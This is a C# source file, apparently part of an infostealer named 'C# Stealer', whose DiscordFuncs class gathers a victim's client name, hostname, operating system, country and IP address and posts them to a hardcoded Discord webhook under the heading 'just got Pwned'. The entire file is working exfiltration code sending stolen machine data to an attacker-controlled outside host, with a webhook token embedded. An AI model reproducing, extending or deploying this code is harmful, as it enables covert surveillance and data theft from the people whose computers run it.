using System.Text;
using ScrapeInformations;
using Newtonsoft.Json;

namespace DiscordStuff
{

    internal class DiscordFuncs
    {
        const string WEBHOOK_URL = "https://discord.com/api/webhooks/1318606616450437130/CB9flfmsdt8X3YKG5N2nV3Cdvm0LjYP9PYxp1UoqwXjhlGx3kIqaIQzjyCR-OUu8A9WA";


        async public void SendData()
        {
            // Bot Variables
            string botName = "C# Stealer";
            long color = 16711680;

            ScrapeInformationsFuncs scrapeFuncs = new ScrapeInformationsFuncs();

            var embed = new
            {
                color = color,
                fields = new[]
               {
                    new { name = $"{scrapeFuncs.GetClientName()} just got Pwned", value = "" },
                    new { name = "Hostname", value = scrapeFuncs.GetMachineName() },
                    new { name = "OS", value = scrapeFuncs.GetOperatingSystem() },
                    new { name = "Country", value = scrapeFuncs.GetCountry() },
                    new { name = "IP", value = scrapeFuncs.GetIP() }
                }
            };

            var payload = new
            {
                content = "",
                username = botName,
                color = color,
                embeds = new[] { embed }
            };

            HttpClient client = new HttpClient();

            string jsonPayload = JsonConvert.SerializeObject(payload);
            var requestContent = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

            var requestResponse = client.PostAsync(WEBHOOK_URL, requestContent).Result;

            if ((int)requestResponse.StatusCode == 204)
            {
                Console.WriteLine("Succesfull");
            } else
            {
                Console.WriteLine("Error: " + (int) requestResponse.StatusCode);
            }
        }
    }
}
